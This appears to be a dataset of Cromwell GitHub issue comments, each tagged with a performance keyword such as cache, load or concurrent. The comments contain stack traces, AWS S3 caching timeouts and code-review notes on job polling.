Performance,h(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. I tried reading the code but I don't know scala so did not get ve,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1810,cache,cache,1810,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['cache'],['cache']
Performance,"hanging = ""job will run forever unless terminated"". Wrote that previous comment too quickly, I guess. Simply requesting that cromwell stdout prints a status similar to Queue -- this makes debugging a lot easier:. ```; .....snip....; INFO  15:50:08,653 QGraph - 0 Pend, 1 Run, 0 Fail, 1375 Done; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1593#issuecomment-254806519:168,Queue,Queue,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1593#issuecomment-254806519,1,['Queue'],['Queue']
Performance,"he copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1756,tune,tune,1756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['tune'],['tune']
Performance,"he moment, so it's unlikely I or others on the team will have time to look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:1240,cache,cache,1240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,1,['cache'],['cache']
Performance,"he script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:1159,concurren,concurrently,1159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383,1,['concurren'],['concurrently']
Performance,hooray for fixing a concurrency issue using a scheme other than Await.result! :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/224#issuecomment-146004002:20,concurren,concurrency,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/224#issuecomment-146004002,1,['concurren'],['concurrency']
Performance,"host/port is nice when you think about autoscaling. having the config file need to be different on every machine will be a headache when you want an ELB to spin up more nodes based on load. in a non-container world, that's straightforward. In a container world, the hostname (as defined by /etc/hostname, which is what typical java apis use to determine hostname) is set to a unique container id. So even if you're running multiple containers on the same host on the same port (pre-NAT) you'll get unique IDs. ```; wm80b-899:~ $ echo $HOSTNAME; wm80b-899; wm80b-899:~ $ docker run -it ubuntu /bin/bash -i; root@62d62e5dc805:/# echo $HOSTNAME; 62d62e5dc805; root@62d62e5dc805:/# cat /etc/hostname; 62d62e5dc805; root@62d62e5dc805:/# ; ```. @jacmrob",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371247207:184,load,load,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371247207,1,['load'],['load']
Performance,ilbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.util.ServiceConfigurationError: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at java.util.ServiceLoader.fail(ServiceLoader.java:239); 	at java.util.ServiceLoader.access$300(ServiceLoader.java:185); 	at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:372); 	at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:6282,load,loadService,6282,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loadService']
Performance,impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321); 	at com.google.api.client.http.Ht,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2743,concurren,concurrent,2743,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,"in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per job may overwhelm the SGE scheduler if hundreds or thousands of scatter jobs are running, so more work may need t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:1329,cache,cache,1329,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,1,['cache'],['cache']
Performance,"inPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJob",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3994,concurren,concurrent,3994,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,"ing to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104);",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3421,concurren,concurrent,3421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"ins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/992/ (0 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/993/ (1 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/994/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/995/ (1 tot",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1425,Perform,PerformanceTest-against-Alpha,1425,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['Perform'],['PerformanceTest-against-Alpha']
Performance,internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsCl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7226,load,loader,7226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loader']
Performance,"ion, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at ja",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:1406,concurren,concurrent,1406,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"ion, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:17,54] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.AllelicCNV:3:1] Status change from Running to Success; [2016-10-28 14:38:17,67] [info] WorkflowExecutionActor-a3dd8163-de37-4467-a227-5364959a8940 [a3dd8163]: Starting calls: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun 